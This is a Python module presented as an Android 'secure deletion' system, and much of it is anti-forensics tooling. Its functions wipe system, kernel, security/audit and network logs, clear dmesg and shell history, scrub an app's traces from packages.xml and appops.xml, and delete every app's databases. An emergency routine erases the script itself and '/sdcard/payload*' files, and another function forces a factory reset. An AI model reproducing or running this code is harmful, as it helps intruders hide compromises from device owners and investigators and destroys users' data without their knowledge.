
"""
Secure Deletion Module for Advanced Data Sanitization
Implements comprehensive data wiping and cleanup techniques
"""

import os
import sys
import random
import time
import shutil
import subprocess
import threading
import hashlib
from pathlib import Path
from typing import List, Dict, Optional, Callable
import psutil

class SecureDelete:
    """Advanced secure deletion and data sanitization system"""
    

    WIPE_PATTERNS = [

        {'name': 'dod_3pass', 'passes': [b'\x00', b'\xFF', 'random']},
        

        {'name': 'gutmann', 'passes': [
            b'\x55', b'\xAA', b'\x92\x49\x24', b'\x49\x24\x92',
            b'\x24\x92\x49', b'\x00', b'\x11', b'\x22', b'\x33',
            b'\x44', b'\x55', b'\x66', b'\x77', b'\x88', b'\x99',
            b'\xAA', b'\xBB', b'\xCC', b'\xDD', b'\xEE', b'\xFF',
            'random', 'random', 'random', 'random', 'random', 'random'
        ]},
        

        {'name': 'simple_7pass', 'passes': [
            b'\x00', b'\xFF', b'\x55', b'\xAA',
            'random', 'random', 'random'
        ]},
        

        {'name': 'nist', 'passes': ['random']}
    ]
    
    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.deletion_log = []
        self.emergency_mode = False
        
    def secure_delete_file(self, file_path: str, method: str = 'dod_3pass',
                          verify: bool = True) -> bool:
        """Securely delete a single file with specified method"""
        try:
            if not os.path.exists(file_path):
                self._log(f"File not found: {file_path}")
                return False
            

            file_size = os.path.getsize(file_path)
            self._log(f"Starting secure deletion of {file_path} ({file_size} bytes)")
            

            pattern_info = next((p for p in self.WIPE_PATTERNS if p['name'] == method), None)
            if not pattern_info:
                self._log(f"Unknown wipe method: {method}")
                return False
            

            with open(file_path, 'r+b') as f:
                for i, pattern in enumerate(pattern_info['passes']):
                    self._log(f"Pass {i+1}/{len(pattern_info['passes'])}")
                    

                    if pattern == 'random':
                        pattern_data = self._generate_random_pattern(file_size)
                    else:
                        pattern_data = self._expand_pattern(pattern, file_size)
                    

                    f.seek(0)
                    f.write(pattern_data)
                    f.flush()
                    os.fsync(f.fileno())
                    
                    time.sleep(0.01)
            

            if verify:
                if not self._verify_overwrite(file_path, file_size):
                    self._log(f"Verification failed for {file_path}")
                    return False
            

            os.unlink(file_path)
            

            self._overwrite_directory_entry(file_path)
            
            self._log(f"Successfully deleted: {file_path}")
            return True
            
        except Exception as e:
            self._log(f"Error deleting {file_path}: {str(e)}")
            return False
    
    def secure_delete_directory(self, dir_path: str, method: str = 'dod_3pass',
                               recursive: bool = True) -> bool:
        """Securely delete entire directory tree"""
        try:
            if not os.path.exists(dir_path):
                self._log(f"Directory not found: {dir_path}")
                return False
            
            success = True
            
            if recursive:

                for root, dirs, files in os.walk(dir_path, topdown=False):

                    for file in files:
                        file_path = os.path.join(root, file)
                        if not self.secure_delete_file(file_path, method):
                            success = False
                    

                    for dir in dirs:
                        dir_path_full = os.path.join(root, dir)
                        try:
                            os.rmdir(dir_path_full)
                            self._log(f"Removed directory: {dir_path_full}")
                        except OSError as e:
                            self._log(f"Failed to remove directory {dir_path_full}: {e}")
                            success = False
                

                try:
                    os.rmdir(dir_path)
                    self._log(f"Removed root directory: {dir_path}")
                except OSError as e:
                    self._log(f"Failed to remove root directory {dir_path}: {e}")
                    success = False
            else:

                for item in os.listdir(dir_path):
                    item_path = os.path.join(dir_path, item)
                    if os.path.isfile(item_path):
                        if not self.secure_delete_file(item_path, method):
                            success = False
            
            return success
            
        except Exception as e:
            self._log(f"Error deleting directory {dir_path}: {str(e)}")
            return False
    
    def cleanup_app_data(self, package_name: str = None) -> bool:
        """Clean up application data and traces"""
        success = True
        

        app_data_paths = [
            f'/data/data/{package_name}' if package_name else '/data/data/*',
            f'/storage/emulated/0/Android/data/{package_name}' if package_name else '/storage/emulated/0/Android/data/*',
            '/sdcard/Android/data/*',
            '/data/local/tmp',
            '/cache',
            '/data/cache'
        ]
        

        system_paths = [
            '/data/system/packages.xml',
            '/data/system/appops.xml',
            '/data/system_de/*/accounts_de.db',
            '/data/misc/profiles'
        ]
        
        self._log("Starting app data cleanup...")
        

        for path_pattern in app_data_paths:
            try:
                if '*' in path_pattern:

                    base_path = path_pattern.replace('/*', '')
                    if os.path.exists(base_path):
                        for item in os.listdir(base_path):
                            item_path = os.path.join(base_path, item)
                            if package_name and package_name not in item:
                                continue
                            if not self.secure_delete_directory(item_path):
                                success = False
                else:
                    if os.path.exists(path_pattern):
                        if not self.secure_delete_directory(path_pattern):
                            success = False
            except Exception as e:
                self._log(f"Error cleaning {path_pattern}: {e}")
                success = False
        

        for sys_path in system_paths:
            try:
                if os.path.exists(sys_path):
                    if package_name:

                        self._clean_package_references(sys_path, package_name)
                    else:
                        self.secure_delete_file(sys_path)
            except Exception as e:
                self._log(f"Error cleaning system path {sys_path}: {e}")
        
        return success
    
    def delete_logs(self, log_types: List[str] = None) -> bool:
        """Delete various system and application logs"""
        if log_types is None:
            log_types = ['system', 'kernel', 'app', 'security', 'network']
        
        success = True
        
        log_locations = {
            'system': [
                '/data/log',
                '/cache/recovery/log',
                '/data/tombstones',
                '/data/system/dropbox',
                '/data/system/usagestats'
            ],
            'kernel': [
                '/proc/kmsg',
                '/dev/log',
                '/data/dontpanic'
            ],
            'app': [
                '/data/system/appops.xml',
                '/data/system/packages-stopped.xml',
                '/data/system/packages-stopped-backup.xml'
            ],
            'security': [
                '/data/misc/audit',
                '/data/security',
                '/data/system/audit'
            ],
            'network': [
                '/data/misc/wifi/wpa_supplicant.conf',
                '/data/misc/dhcp',
                '/proc/net/route',
                '/proc/net/arp'
            ]
        }
        
        self._log("Starting log deletion...")
        
        for log_type in log_types:
            if log_type in log_locations:
                for log_path in log_locations[log_type]:
                    try:
                        if os.path.exists(log_path):
                            if os.path.isfile(log_path):
                                if not self.secure_delete_file(log_path):
                                    success = False
                            elif os.path.isdir(log_path):
                                if not self.secure_delete_directory(log_path):
                                    success = False
                    except Exception as e:
                        self._log(f"Error deleting log {log_path}: {e}")
                        success = False
        

        try:
            subprocess.run(['dmesg', '-c'], capture_output=True, timeout=5)
        except:
            pass
        

        try:
            history_files = [
                os.path.expanduser('~/.bash_history'),
                os.path.expanduser('~/.history'),
                '/data/local/tmp/.bash_history'
            ]
            for hist_file in history_files:
                if os.path.exists(hist_file):
                    self.secure_delete_file(hist_file)
        except:
            pass
        
        return success
    
    def trigger_factory_reset(self, confirmation_code: str = None,
                            delay_seconds: int = 10) -> bool:
        """Trigger factory reset with optional delay"""
        if confirmation_code != "CONFIRM_FACTORY_RESET":
            self._log("Factory reset requires confirmation code")
            return False
        
        self._log(f"Factory reset will trigger in {delay_seconds} seconds...")
        
        def execute_reset():
            time.sleep(delay_seconds)
            try:

                subprocess.run(['reboot', 'recovery'], timeout=5)
            except:
                try:

                    subprocess.run(['am', 'broadcast', '-a',
                                  'android.intent.action.MASTER_CLEAR'], timeout=5)
                except:
                    try:

                        subprocess.run(['recovery', '--wipe_data'], timeout=5)
                    except:
                        self._log("Factory reset failed - all methods exhausted")
        

        reset_thread = threading.Thread(target=execute_reset, daemon=True)
        reset_thread.start()
        
        return True
    
    def emergency_cleanup(self, target_files: List[str] = None) -> bool:
        """Rapid emergency cleanup of critical files"""
        self.emergency_mode = True
        self._log("EMERGENCY CLEANUP INITIATED")
        
        if target_files is None:

            target_files = [
                __file__,
                '/data/local/tmp/*',
                '/sdcard/payload*',
                '/data/data/*/databases/*',
                '/data/data/*/shared_prefs/*'
            ]
        
        success = True
        
        for target in target_files:
            try:
                if '*' in target:

                    import glob
                    matches = glob.glob(target)
                    for match in matches:
                        if os.path.isfile(match):

                            self._quick_overwrite(match)
                            os.unlink(match)
                        elif os.path.isdir(match):
                            shutil.rmtree(match, ignore_errors=True)
                else:
                    if os.path.exists(target):
                        if os.path.isfile(target):
                            self._quick_overwrite(target)
                            os.unlink(target)
                        elif os.path.isdir(target):
                            shutil.rmtree(target, ignore_errors=True)
            except Exception as e:
                self._log(f"Emergency cleanup failed for {target}: {e}")
                success = False
        

        try:

            import gc
            gc.collect()
            

            for var_name in list(globals().keys()):
                if not var_name.startswith('__'):
                    globals()[var_name] = None
        except:
            pass
        
        return success
    
    def _generate_random_pattern(self, size: int) -> bytes:
        """Generate random pattern for overwriting"""
        return bytes([random.randint(0, 255) for _ in range(size)])
    
    def _expand_pattern(self, pattern: bytes, size: int) -> bytes:
        """Expand pattern to fill entire file"""
        if len(pattern) >= size:
            return pattern[:size]
        
        repetitions = (size // len(pattern)) + 1
        expanded = pattern * repetitions
        return expanded[:size]
    
    def _verify_overwrite(self, file_path: str, original_size: int) -> bool:
        """Verify file was properly overwritten"""
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
                

                if len(content) != original_size:
                    return False
                


                if b'\x00' * 100 in content[:1000] and b'\xFF' * 100 in content[-1000:]:
                    return False
                
                return True
        except:
            return False
    
    def _overwrite_directory_entry(self, file_path: str):
        """Try to overwrite directory entry (limited effectiveness)"""
        try:
            parent_dir = os.path.dirname(file_path)
            filename = os.path.basename(file_path)
            

            random_name = ''.join(random.choices(
                'abcdefghijklmnopqrstuvwxyz0123456789', k=len(filename)))
            random_path = os.path.join(parent_dir, random_name)
            

            with open(random_path, 'w') as f:
                f.write('x')
            os.unlink(random_path)
            
        except:
            pass
    
    def _clean_package_references(self, file_path: str, package_name: str):
        """Remove package references from system files"""
        try:
            if file_path.endswith('.xml'):

                with open(file_path, 'r') as f:
                    content = f.read()
                

                lines = content.split('\n')
                cleaned_lines = [line for line in lines if package_name not in line]
                
                if len(cleaned_lines) < len(lines):
                    with open(file_path, 'w') as f:
                        f.write('\n'.join(cleaned_lines))
                        
        except Exception as e:
            self._log(f"Error cleaning package references: {e}")
    
    def _quick_overwrite(self, file_path: str):
        """Quick single-pass random overwrite for emergency cleanup"""
        try:
            file_size = os.path.getsize(file_path)
            random_data = self._generate_random_pattern(file_size)
            
            with open(file_path, 'r+b') as f:
                f.write(random_data)
                f.flush()
                os.fsync(f.fileno())
                
        except:
            pass
    
    def _log(self, message: str):
        """Log deletion activities"""
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        
        if self.verbose:
            print(log_entry)
        
        self.deletion_log.append(log_entry)


def quick_cleanup(files_or_dirs: List[str], method: str = 'nist') -> bool:
    """Quick cleanup utility function"""
    deleter = SecureDelete(verbose=False)
    success = True
    
    for target in files_or_dirs:
        if os.path.isfile(target):
            if not deleter.secure_delete_file(target, method):
                success = False
        elif os.path.isdir(target):
            if not deleter.secure_delete_directory(target, method):
                success = False
    
    return success

def wipe_free_space(path: str = '/tmp', size_mb: int = 100):
    """Wipe free space by creating and deleting large files"""
    try:
        temp_file = os.path.join(path, f'wipe_{random.randint(1000, 9999)}.tmp')
        size_bytes = size_mb * 1024 * 1024
        

        with open(temp_file, 'wb') as f:
            remaining = size_bytes
            while remaining > 0:
                chunk_size = min(remaining, 1024 * 1024)
                chunk = bytes([random.randint(0, 255) for _ in range(chunk_size)])
                f.write(chunk)
                remaining -= chunk_size
        

        deleter = SecureDelete()
        deleter.secure_delete_file(temp_file, 'dod_3pass')
        
    except Exception as e:
        print(f"Free space wipe error: {e}")


if __name__ == "__main__":
    print("Secure Deletion System Test")
    

    test_dir = "./test_secure_delete"
    os.makedirs(test_dir, exist_ok=True)
    
    test_files = []
    for i in range(3):
        test_file = os.path.join(test_dir, f"test_file_{i}.txt")
        with open(test_file, 'w') as f:
            f.write(f"This is test file {i} with some sensitive data.\n" * 100)
        test_files.append(test_file)
    

    deleter = SecureDelete(verbose=True)
    
    print("\n=== Testing File Deletion ===")
    for test_file in test_files:
        success = deleter.secure_delete_file(test_file, 'dod_3pass')
        print(f"Deletion of {test_file}: {'SUCCESS' if success else 'FAILED'}")
    
    print("\n=== Testing Directory Deletion ===")

    test_dir2 = "./test_dir_delete"
    os.makedirs(test_dir2, exist_ok=True)
    for i in range(2):
        with open(os.path.join(test_dir2, f"file_{i}.txt"), 'w') as f:
            f.write("Sensitive directory content\n" * 50)
    
    success = deleter.secure_delete_directory(test_dir2)
    print(f"Directory deletion: {'SUCCESS' if success else 'FAILED'}")
    
    print("\n=== Testing Log Cleanup ===")
    log_success = deleter.delete_logs(['app'])
    print(f"Log cleanup: {'SUCCESS' if log_success else 'FAILED'}")
    

    try:
        shutil.rmtree(test_dir, ignore_errors=True)
    except:
        pass
    
    print("\nSecure deletion test completed.")
